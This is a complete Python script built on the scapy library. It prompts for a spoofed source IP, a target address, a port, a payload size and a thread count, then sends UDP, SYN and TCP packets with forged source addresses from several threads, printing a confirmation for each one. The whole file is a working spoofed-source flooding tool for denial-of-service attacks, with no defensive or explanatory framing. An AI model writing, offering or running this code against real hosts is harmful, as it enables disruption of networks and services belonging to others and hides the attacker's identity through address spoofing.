import random
from scapy.all import *
from colorama import Fore, Style
import threading

def send_udp_packet(src_ip, dst_ip, dst_port, max_data_size):
    data = bytes([random.randint(0, 255) for _ in range(max_data_size)])
    packet = IP(src=src_ip, dst=dst_ip)/UDP(dport=dst_port)/Raw(load=data)
    send(packet, verbose=False)
    print(Fore.GREEN + "UDP packet sent with spoofed source IP: " + src_ip + Style.RESET_ALL)

def send_syn_packet(src_ip, dst_ip, dst_port):
    packet = IP(src=src_ip, dst=dst_ip)/TCP(dport=dst_port, flags="S")
    send(packet, verbose=False)
    print(Fore.BLUE + "SYN packet sent with spoofed source IP: " + src_ip + Style.RESET_ALL)

def send_tcp_packet(src_ip, dst_ip, dst_port, max_data_size):
    data = bytes([random.randint(0, 255) for _ in range(max_data_size)])
    packet = IP(src=src_ip, dst=dst_ip)/TCP(dport=dst_port)/Raw(load=data)
    send(packet, verbose=False)
    print(Fore.YELLOW + "TCP packet sent with spoofed source IP: " + src_ip + Style.RESET_ALL)

def send_packets_thread(src_ip, dst_ip, dst_port, max_data_size):
    send_udp_packet(src_ip, dst_ip, dst_port, max_data_size)
    send_syn_packet(src_ip, dst_ip, dst_port)
    send_tcp_packet(src_ip, dst_ip, dst_port, max_data_size)

def main():
    src_ip = input("Enter the spoofed source IP address: ")
    dst_ip = input("Enter the destination IP address: ")
    dst_port = int(input("Enter the destination port: "))
    max_data_size = int(input("Enter the maximum data size (bytes): "))
    num_threads = int(input("Enter the number of threads: "))

    threads = []
    for _ in range(num_threads):
        thread = threading.Thread(target=send_packets_thread, args=(src_ip, dst_ip, dst_port, max_data_size))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

if __name__ == "__main__":
    main()
